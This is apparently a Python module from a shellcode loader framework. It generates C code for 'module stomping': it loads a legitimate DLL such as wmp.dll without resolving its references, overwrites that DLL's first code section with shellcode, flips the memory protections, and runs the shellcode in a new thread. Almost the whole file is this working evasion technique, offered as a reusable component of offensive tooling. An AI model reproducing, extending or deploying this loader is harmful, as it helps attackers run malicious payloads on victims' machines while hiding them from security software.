from string import Template
from c.utils.functions import *

class modulestomp:
    def __init__(self, arguments):
        self.target = 'wmp.dll'
        if 'target' in arguments:
            self.target = arguments['target']

    def imports(self) -> list[str]:
        return ["#include <windows.h>"]

    def compilerOptions(self) -> list[str]:
        return []

    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:

        template = '\n\t{transformers}'
        template += LoadLibraryExA('dll', self.target, 'DONT_RESOLVE_DLL_REFERENCES')
        template += '\n\tDWORD size = IMAGE_FIRST_SECTION( (PBYTE)dll + ( ( PIMAGE_DOS_HEADER )dll )->e_lfanew )->SizeOfRawData;'
        template += '\n\tPBYTE text = (PBYTE)dll + IMAGE_FIRST_SECTION( (PBYTE)dll + ( ( PIMAGE_DOS_HEADER )dll )->e_lfanew )->VirtualAddress;'
        template += VirtualProtect('text', '{shellcodeSize}', 'PAGE_READWRITE')
        template += memcpy('text', 'shellcode', '{shellcodeSize}')
        template += VirtualProtect('text', '{shellcodeSize}', 'PAGE_EXECUTE_READ')
        template += CreateRemoteThread('hThread', '(HANDLE)-1', 'text')
        template += WaitForSingleObject('hThread', 'INFINITE')

        return template